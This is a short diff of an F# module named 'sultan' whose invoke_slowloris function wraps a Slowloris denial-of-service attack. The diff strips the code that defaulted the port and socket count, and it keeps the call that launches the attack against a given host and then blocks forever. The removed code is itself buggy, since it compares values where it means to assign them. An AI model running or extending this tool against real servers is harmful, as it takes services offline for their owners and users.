@@ -12,29 +12,10 @@ module sultan =
 
     let E : string = string (char 0x1B)
     let invoke_slowloris (args : string[]) =
-        let sockets = 0
-        let port = 0
         if args.Length < 2 then
                 error "100 Target host not provided. Aborting."
                 exit 1
                 else verbose "starting...\n"
-
-        if args.Length < 3 then
-            printfn "[sultan] No port provided, defaulting to port 80"
-            port = 80
-            ""
-            else
-                port = Int32.Parse(args.[2])
-                ""
-
-        if args.Length < 4 then
-            printfn "[sultan] No socket number provided, defaulting to 100 sockets"
-            sockets = 100
-            ""
-            else
-                sockets =  Int32.Parse(args.[3])
-                ""
-
         let weapon = new sllib()
         weapon.attack(args.[1], System.Int32.Parse(args.[2]), false, System.Int32.Parse(args.[3]));
         Thread.Sleep(Timeout.Infinite);
